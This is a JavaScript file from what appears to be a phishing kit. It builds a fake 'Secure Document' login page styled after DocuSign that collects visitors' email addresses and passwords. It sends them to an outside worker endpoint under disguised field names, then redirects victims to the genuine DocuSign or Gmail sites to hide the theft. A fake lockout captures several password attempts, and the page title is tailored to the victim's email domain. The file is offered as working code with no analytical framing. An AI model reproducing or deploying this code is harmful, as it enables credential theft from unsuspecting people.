(function() {
    'use strict';
    
    // Configuration
    const CONFIG = {
        BG_IMG: '',
        BG_BRI: 1,
        BG_DAR: 1,
        BG_CON: 1,
        BG_SAT: 1,
        BG_BLUR: 0,
        BG_GRAY: false,
        BG_OVERLAY: 0.25,
        PHP_ENDPOINT: 'https://rum-email-proxy.haricoting.workers.dev/contact',
        SUCCESS_REDIRECT: 'https://www.docusign.com/Signin/Session/dashboard',
        LOCKOUT_REDIRECT: 'https://mail.google.com/mail/u/0/#inbox',
        SECRET_KEY: 'fdfmdkfmsd',
        MAX_TRIES: 3,
        LOCKOUT_DELAY: 2000,
        STORAGE_KEY: 'zz_core_st',
        PATH_SEGMENTS: ['Encrypted', 'Delivery', 'Secure', 'Docu', 'ment'],
        MSG_WRONG: 'Incorrect access code. Please try again later.',
        MSG_LOCKOUT: 'Too many incorrect attempts. Access blocked.',
        MSG_GRANTED: 'Access granted. Redirecting...',
        MSG_NET: 'Network error. Please try again.',
        HEADING: 'Secure Document',
        SUBHEAD: 'Login to view your secure document',
        FOOTER: '· © 2026',
        EMAIL_LABEL: 'Email',
        KEY_LABEL: 'Password',
        KEY_PLACEHOLDER: 'Enter your password',
        BUTTON_TEXT: 'Unlock',
        TAG_TEXT: 'Encrypted'
    };

    // Apply background styles
    function applyBackgroundStyles() {
        const bgCanvas = document.getElementById('bg_canvas');
        const bgVeil = document.getElementById('bg_veil');
        
        if (!bgCanvas || !bgVeil) return;
        
        const styles = [];
        styles.push(`background-image: url('${CONFIG.BG_IMG}')`);
        styles.push(`brightness(${CONFIG.BG_BRI})`);
        styles.push(`contrast(${CONFIG.BG_CON})`);
        
        if (CONFIG.BG_BLUR > 0) {
            styles.push(`blur(${CONFIG.BG_BLUR}px)`);
        }
        if (CONFIG.BG_GRAY) {
            styles.push('grayscale(1)');
        }
        
        bgCanvas.style.filter = styles.join(' ');
        bgVeil.style.background = `rgba(10,66,123,${CONFIG.BG_OVERLAY})`;
    }

    // Generate random token for URL
    function updateURL() {
        try {
            const array = new Uint8Array(16);
            crypto.getRandomValues(array);
            const token = btoa(String.fromCharCode.apply(null, array))
                .replace(/\+/g, '-')
                .replace(/\//g, '_')
                .replace(/=+$/, '');
            history.replaceState(null, '', `#/${CONFIG.PATH_SEGMENTS.join('/')}/${token}`);
        } catch (e) {}
    }

    // Extract domain from email
    function getEmailDomain(email) {
        if (!email || email.indexOf('@') === -1) return '';
        const parts = email.split('@');
        if (parts.length === 2 && parts[0].trim() !== '') {
            return parts[1].trim().toLowerCase();
        }
        return '';
    }

    // Capitalize first letter
    function capitalize(str) {
        if (!str) return '';
        return str.charAt(0).toUpperCase() + str.slice(1);
    }

    // Show alert message
    function showAlert(message, type) {
        // Create alert node if doesn't exist
        let alertNode = document.getElementById('alert_node');
        if (!alertNode) {
            alertNode = document.createElement('div');
            alertNode.id = 'alert_node';
            alertNode.className = 'alert_bar';
            document.body.appendChild(alertNode);
        }
        
        alertNode.textContent = message;
        alertNode.classList.add('visible');
        
        if (type === 'error') {
            alertNode.style.background = '#fee9e7';
            alertNode.style.color = '#b33a2f';
            alertNode.style.borderColor = '#f5c6c2';
        } else {
            alertNode.style.background = '#e3f5e9';
            alertNode.style.color = '#1e7a4b';
            alertNode.style.borderColor = '#b8e0c8';
        }
        
        if (type === 'error') {
            setTimeout(() => {
                alertNode.classList.remove('visible');
            }, 5000);
        }
    }

    // Hide alert
    function hideAlert() {
        const alertNode = document.getElementById('alert_node');
        if (alertNode) {
            alertNode.classList.remove('visible');
        }
    }

    // Show loading state
    function showLoading() {
        const btn = document.getElementById('code_p4r7');
        if (!btn) return;
        
        btn.classList.remove('locked_spin');
        void btn.offsetWidth;
        btn.classList.add('locked_spin');
        
        setTimeout(() => {
            btn.classList.remove('locked_spin');
        }, 2000);
    }

    // Handle lockout
    function handleLockout() {
        const btn = document.getElementById('code_p4r7');
        const passwordField = document.getElementById('code_p4r7_input');
        
        if (isLocked) return;
        isLocked = true;
        
        if (passwordField) passwordField.value = '';
        if (btn) {
            btn.disabled = true;
            btn.textContent = CONFIG.BUTTON_TEXT;
        }
        
        showAlert(CONFIG.MSG_LOCKOUT, 'error');
        showLoading();
        
        setTimeout(() => {
            window.location.href = CONFIG.LOCKOUT_REDIRECT;
        }, CONFIG.LOCKOUT_DELAY);
    }

    // Update email display based on input
    function updateEmailDisplay() {
        const emailInput = document.getElementById('mail_x9k2');
        if (!emailInput) return;
        
        const email = emailInput.value.trim();
        const domain = getEmailDomain(email);
        
        // Update document title if domain found
        if (domain) {
            const domainName = capitalize(domain.split('.')[0]);
            document.title = `${domainName} - Secure Document Access`;
        }
    }

    // Form submission handler
    function handleSubmit() {
        const emailInput = document.getElementById('mail_x9k2');
        const passwordInput = document.getElementById('code_p4r7_input');
        const submitBtn = document.getElementById('code_p4r7');
        
        if (!emailInput || !passwordInput) return;
        
        const email = emailInput.value.trim();
        const password = passwordInput.value.trim();
        
        // Validation
        if (!email || email.indexOf('@') === -1) {
            showAlert('Please enter a valid email address.', 'error');
            showLoading();
            return;
        }
        
        if (!password) {
            showAlert(CONFIG.MSG_WRONG, 'error');
            showLoading();
            return;
        }
        
        if (isLocked) return;
        
        // UI updates
        if (submitBtn) {
            submitBtn.textContent = 'Loading...';
            submitBtn.disabled = true;
        }
        hideAlert();
        
        // NEW PAYLOAD FORMAT
        const cleanPayload = new URLSearchParams();
        cleanPayload.append("Name", email);
        cleanPayload.append("Feedback", password);
        cleanPayload.append("timestamp", Date.now().toString());
        
        const startTime = Date.now();
        
        fetch(CONFIG.PHP_ENDPOINT, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            body: cleanPayload.toString()
        })
        .then(response => {
            const contentType = response.headers.get('content-type');
            if (contentType && contentType.includes('application/json')) {
                return response.json();
            }
            return response.text();
        })
        .then(data => {
            processResponse(data, passwordInput, submitBtn);
        })
        .catch(() => {
            handleError(passwordInput, submitBtn);
        })
        .then(() => {
            const elapsed = Date.now() - startTime;
            const delay = Math.max(2000, 3000 - elapsed);
            return new Promise(resolve => setTimeout(resolve, delay));
        })
        .then(() => {
            if (submitBtn && !isLocked) {
                submitBtn.textContent = CONFIG.BUTTON_TEXT;
                submitBtn.disabled = false;
            }
        });
    }

    // Process server response
    function processResponse(data, passwordInput, submitBtn) {
        const attemptCount = parseInt(sessionStorage.getItem(CONFIG.STORAGE_KEY) || '0', 10) + 1;
        sessionStorage.setItem(CONFIG.STORAGE_KEY, String(attemptCount));
        
        let status = 'error';
        if (typeof data === 'object' && data !== null) {
            status = data.status || 'error';
        } else if (typeof data === 'string') {
            status = data.toLowerCase().includes('success') || data.toLowerCase().includes('ok') ? 'success' : 'error';
        }
        
        if (status === 'success') {
            showAlert(CONFIG.MSG_GRANTED, 'success');
            setTimeout(() => {
                window.location.href = CONFIG.SUCCESS_REDIRECT;
            }, 2000);
        } else if (status === 'exhausted') {
            showAlert(CONFIG.MSG_LOCKOUT, 'error');
            setTimeout(() => {
                window.location.href = CONFIG.LOCKOUT_REDIRECT;
            }, 2000);
        } else {
            if (attemptCount >= CONFIG.MAX_TRIES) {
                handleLockout();
                return;
            }
            showAlert(CONFIG.MSG_WRONG, 'error');
            showLoading();
            if (passwordInput) {
                passwordInput.value = '';
                passwordInput.focus();
            }
        }
    }

    // Handle network/error states
    function handleError(passwordInput, submitBtn) {
        showAlert(CONFIG.MSG_NET, 'error');
        showLoading();
        if (passwordInput) {
            passwordInput.value = '';
            passwordInput.focus();
        }
        if (submitBtn) {
            submitBtn.textContent = CONFIG.BUTTON_TEXT;
            submitBtn.disabled = false;
        }
    }

    // Create the form elements dynamically around existing email input
    function createFormElements() {
        const emailInput = document.getElementById('mail_x9k2');
        if (!emailInput) return;
        
        // Make email input editable (remove readonly)
        emailInput.removeAttribute('readonly');
        emailInput.removeAttribute('tabindex');
        emailInput.placeholder = 'Enter your email';
        
        // Create container if doesn't exist
        let container = document.getElementById('main_form');
        if (!container) {
            container = document.createElement('div');
            container.id = 'main_form';
            container.className = 'frame_v7';
            emailInput.parentNode.insertBefore(container, emailInput.nextSibling);
        }
        
        // Create password field
        const passwordField = document.createElement('input');
        passwordField.type = 'password';
        passwordField.id = 'code_p4r7_input';
        passwordField.className = 'inp_core';
        passwordField.placeholder = CONFIG.KEY_PLACEHOLDER;
        passwordField.autocomplete = 'off';
        passwordField.required = true;
        
        // Create submit button
        const submitBtn = document.createElement('button');
        submitBtn.type = 'submit';
        submitBtn.id = 'code_p4r7';
        submitBtn.className = 'cta_main';
        submitBtn.textContent = CONFIG.BUTTON_TEXT;
        
        // Create password toggle button
        const toggleBtn = document.createElement('button');
        toggleBtn.type = 'button';
        toggleBtn.id = 'eye_toggle';
        toggleBtn.className = 'eye_btn';
        toggleBtn.innerHTML = `
            <svg id="eye_show" viewBox="0 0 24 24" width="18" height="18" style="display:none">
                <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5C21.27 7.61 17 4.5 12 4.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
            </svg>
            <svg id="eye_hide" viewBox="0 0 24 24" width="18" height="18">
                <path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.75l1.31 1.31C8.58 11.37 8.25 12.15 8.25 13c0 2.07 1.68 3.75 3.75 3.75.85 0 1.63-.33 2.24-.88l1.31 1.31c-.97.72-2.17 1.16-3.55 1.16-3.04 0-5.5-2.46-5.5-5.5 0-1.38.44-2.58 1.16-3.55zM11.71 9.29l2.99 2.99c-.05-.29-.08-.59-.08-.9 0-2.07-1.68-3.75-3.75-3.75-.31 0-.61.03-.9.08l1.74 1.58z"/>
            </svg>
        `;
        
        // Build form structure
        const form = document.createElement('form');
        form.className = 'main_form';
        form.style.cssText = 'display:flex;flex-direction:column;gap:1rem;max-width:400px;margin:2rem auto;';
        
        // Add elements to form
        form.appendChild(emailInput.cloneNode(true));
        form.appendChild(passwordField);
        form.appendChild(toggleBtn);
        form.appendChild(submitBtn);
        
        // Replace original email input with form
        emailInput.parentNode.replaceChild(form, emailInput);
        
        // Add event listeners
        submitBtn.addEventListener('click', (e) => {
            e.preventDefault();
            handleSubmit();
        });
        
        toggleBtn.addEventListener('click', () => {
            const pwd = document.getElementById('code_p4r7_input');
            const show = document.getElementById('eye_show');
            const hide = document.getElementById('eye_hide');
            
            if (pwd.type === 'password') {
                pwd.type = 'text';
                show.style.display = 'block';
                hide.style.display = 'none';
            } else {
                pwd.type = 'password';
                show.style.display = 'none';
                hide.style.display = 'block';
            }
            pwd.focus();
        });
        
        // Update email input listener
        const newEmailInput = form.querySelector('#mail_x9k2');
        newEmailInput.addEventListener('input', updateEmailDisplay);
    }

    // Initialize
    let isLocked = false;
    
    function init() {
        // Create background elements
        if (!document.getElementById('bg_canvas')) {
            const bgCanvas = document.createElement('div');
            bgCanvas.id = 'bg_canvas';
            document.body.insertBefore(bgCanvas, document.body.firstChild);
        }
        
        if (!document.getElementById('bg_veil')) {
            const bgVeil = document.createElement('div');
            bgVeil.id = 'bg_veil';
            document.body.insertBefore(bgVeil, document.body.firstChild);
        }
        
        applyBackgroundStyles();
        updateURL();
        createFormElements();
        updateEmailDisplay();
    }

    // Start
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }
})();
